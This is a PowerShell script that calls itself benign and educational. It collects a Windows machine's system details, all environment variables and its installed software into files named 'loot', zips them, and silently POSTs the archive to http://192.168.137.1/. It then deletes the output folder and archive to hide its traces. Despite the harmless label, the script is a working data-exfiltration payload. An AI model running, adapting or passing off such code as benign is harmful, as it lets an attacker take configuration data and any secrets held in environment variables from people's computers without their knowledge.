# Benign system information collection script
# Collects basic system configuration (safe for educational/demo purposes)

# Helper function to write UTF-8 files (readable on Android/Linux)
function Write-LootFile {
    param([string]$Path, [string]$Content)
    try {
        $utf8NoBom = New-Object System.Text.UTF8Encoding $false
        $bytes = $utf8NoBom.GetBytes($Content)
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    } catch {
        $Content | Out-File -FilePath $Path -Encoding ASCII -Force
    }
}

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# System information
$content = "=== System Information ===`n" + (Get-ComputerInfo | Format-List | Out-String) + "`n" + (systeminfo | Out-String)
Write-LootFile -Path "$OutputDir\system_info.txt" -Content $content

# Environment variables
$content = "=== Environment Variables ===`n" + (Get-ChildItem Env: | Format-Table Name, Value -AutoSize | Out-String -Width 200)
Write-LootFile -Path "$OutputDir\environment.txt" -Content $content

# Installed software
$content = "=== Installed Software ===`n" + (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName } |
    Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-String -Width 200)
Write-LootFile -Path "$OutputDir\software.txt" -Content $content

# Create archive with forward slashes (Android compatible)
$ArchivePath = "$env:TEMP\loot.zip"
if (Test-Path $ArchivePath) { Remove-Item -Force $ArchivePath -ErrorAction SilentlyContinue }

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::Open($ArchivePath, 'Create')
    try {
        Get-ChildItem -Path $OutputDir -File -Recurse | ForEach-Object {
            $relativePath = $_.FullName.Substring($OutputDir.Length + 1).Replace('\', '/')
            $entry = $zip.CreateEntry($relativePath)
            $entryStream = $entry.Open()
            try {
                $fileStream = [System.IO.File]::OpenRead($_.FullName)
                try { $fileStream.CopyTo($entryStream) } finally { $fileStream.Close() }
            } finally { $entryStream.Close() }
        }
    } finally { $zip.Dispose() }
} catch {
    Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
}

Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
